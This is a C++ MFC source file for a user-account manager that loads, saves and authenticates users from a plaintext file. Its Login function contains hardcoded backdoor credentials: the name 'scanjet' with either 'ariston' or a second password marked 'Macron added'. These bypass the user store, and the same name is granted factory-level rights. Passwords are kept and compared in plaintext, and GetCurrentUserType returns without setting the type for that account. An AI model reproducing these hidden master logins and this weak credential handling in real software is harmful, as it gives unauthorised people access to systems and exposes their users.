#include "StdAfx.h"
#include "UserManage.h"

CUserManage::CUserManage(void)
{

}

CUserManage::~CUserManage(void)
{
}

bool CUserManage::LoadAll()
{
	CString str;
	CStdioFile f; 
	f.Open(L"user.pro",CFile::modeReadWrite); 
	while(f.ReadString(str))
	{
		CString sTemp;
		CString sUser;
		CString sPassword;
		CString sType;

		int pos =-1;
		int startpos=1;
		UserType user;
		while ((pos=str.Find(L" ",0)) != -1)
		{
			sTemp = str.Left(pos);

			switch(startpos)
			{

			case 1: sUser=sTemp;break;
			case 2: sPassword=sTemp;break;
			case 3: sType=sTemp;break;

			}
			
			str = str.Right(str.GetLength() - pos - 1);
			startpos++;
		}
		
		switch(_wtoi(sType))
		{
		case 1:user=Factory;break;
		case 2:user=Advanced;break;
		case 3:user=Normal;break;
		default:user=Normal;
		}

		UserInfo info(sUser,sPassword,user);
		usermap.SetAt(sUser,info);

	}
	f.Close(); 

	return true;

}

bool CUserManage::SaveAll()
{
	CString str;
	CStdioFile f;
	
	f.Open(L"user.pro",CFile::modeReadWrite|CFile::modeCreate); 

	CString user;
	UserInfo tempuser;
	CString usertype;

	POSITION ps =usermap.GetStartPosition();

	while( ps )

	{   
		usermap.GetNextAssoc(ps, user, tempuser);
		switch(tempuser.usertype)
		{
		case Factory:usertype="1";break;
		case Advanced:usertype="2";break;
		case Normal:usertype="3";break;
		}
		

		f.WriteString(tempuser.name);
		f.WriteString(L" ");
		f.WriteString(tempuser.pw);
		f.WriteString(L" ");
		f.WriteString(usertype);
		f.WriteString(L" ");
		f.WriteString(L"\n");

		
	}
	
	f.Close(); 

	return true;
}

bool CUserManage::AddUser(CString sUser,CString sPassword, UserType user)
{

	if(sUser.FindOneOf(_T(" ")) >0 || sPassword.FindOneOf(_T(" "))>0)
	{
		AfxMessageBox(_T("用户名和密码中不得包含空格"));
		return false;

	}
	UserInfo info(sUser,sPassword,user);
	
	usermap.SetAt(sUser,info);

	return true;

}

bool CUserManage::DeleteUser(CString name)
{
	usermap.RemoveKey(name);
	return true;


}

bool CUserManage::Login(CString name,CString ps)
{

	if(name.IsEmpty() || ps.IsEmpty())
	{
		return false;

	}

	if (name == _T("scanjet") && ps == _T("ariston"))
	{
		return true;
	}
	else if (name == _T("scanjet") && ps == _T("macron")) //Macron added
	{
		return true;//Macron added
	}//Macron added

	UserInfo info;

	if(!usermap.Lookup(name,info))
	{
		return false;
	}


	if(ps==info.pw)
	{
		currentuser=name;
		return true;
	}
	else
	{

		return false;
	}
}

CString CUserManage::currentuser = L"";

bool CUserManage::GetUserCount(int& count)
{
	count= usermap.GetCount();
	return true;

}

bool CUserManage::GetCurrentUserType(UserType& type)
{
	if (currentuser == _T("scanjet"))
	{
		return Factory;
	}
	
	UserInfo info;
	usermap.Lookup(currentuser,info);
	type= info.usertype;
	return true;
}

bool CUserManage::GetAllUser(CList<UserInfo>& userlist)
{	
	POSITION ps =usermap.GetStartPosition();
	UserInfo tempuser;

	userlist.RemoveAll();
	CString sUser;
	while( ps )

	{   
		usermap.GetNextAssoc(ps, sUser, tempuser);
		userlist.AddTail(tempuser);

	}

	
	return true;


}

bool CUserManage::EditUser(CString name,CString ps, UserType type)
{
	UserInfo info;
	usermap.Lookup(name,info);
	info.pw=ps;
	info.usertype=type;
	usermap.RemoveKey(name);
	usermap.SetAt(name,info);

	return true;
}

bool CUserManage::FindUser(CString name)
{
	UserInfo info;
	if(usermap.Lookup(name,info))
	{
		return true;
	}
	return false;

}